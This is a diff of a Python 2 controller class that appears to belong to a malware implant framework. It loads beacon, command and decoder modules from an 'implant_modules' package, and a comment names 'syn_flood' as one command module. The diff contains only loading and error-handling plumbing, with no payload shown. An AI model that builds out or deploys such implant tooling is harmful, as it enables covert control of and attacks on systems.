@@ -5,19 +5,21 @@
 #
 
 import inspect
-from importlib import import_module
 import sys
+import warnings
 
 # TODO:
 #
 # - Parse XML to build mappings
 # - Considering wrapping each node into a Node class upon initial import.
+# - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.
 
 BEACON_TYPE_IND = 0
 PARAMS_IND = 1
-BEACON_PKG = 'beacons'
-COMMAND_PKG = 'commands'
-DECODER_PKG = 'decoders'
+MODULE_PATH = 'implant_modules'
+BEACON_PKG = MODULE_PATH + '.' + 'beacons'
+COMMAND_PKG = MODULE_PATH + '.' +'commands'
+DECODER_PKG = MODULE_PATH + '.' +'decoders'
 
 class Controller:
     
@@ -34,23 +36,25 @@ class Controller:
     # ###############
     
     def get_module_class(self, module):
-        
         try:
             for name, obj in inspect.getmembers(module):
-                if inspect.isclass(obj):
+                # must check for parent module name as to avoid imported class objects
+                if inspect.isclass(obj) and obj.__module__ == module.__name__:
                     return obj
                     # have it instantiate the object? depends where I decide to use this method: obj_() creates an instance.
-        except:
-            print "Error getting class from %s module" % (module.__name__)     
-    
+        except Exception, e:
+            print "Error getting class from %s module" % (module.__name__)
+            raise
+
     def easy_import(self, pkg_name, module_name):
         
         try:
-            import_module(module_name, pkg_name)
-            module = sys.modules[module_name]
+            pkg = __import__(pkg_name, fromlist=[module_name])
+            module = getattr(pkg,module_name)
             return self.get_module_class(module)
-        except:
+        except ImportError ,e:
             print "Erorr importing %s from %s" % (module_name, pkg_name)
+            raise
     
     def abstract_builder(self, pkg_name, name_list, return_list = False):
         
@@ -62,6 +66,7 @@ class Controller:
         # ['http_get','syn_flood']
         
         for module_name in name_list:
+            # Fix this so that you can hand a list of all of the types of modules (beacons, commands, etc).
             module_class = self.easy_import(pkg_name, module_name)
             if return_list:
                 ret_val.append(module_class)
@@ -164,13 +169,14 @@ class Controller:
         
         # while there is another decoder, run each item through the next decoder
         data = encoded_data
+        success = True
         
         for decoder in self.decoder_map:
             
             current_decoder = decoder()
             data = self.recursive_decoder(current_decoder, data)
             
-        return data
+        return success, data
     
     def handle_command(self, command, params):
         pass
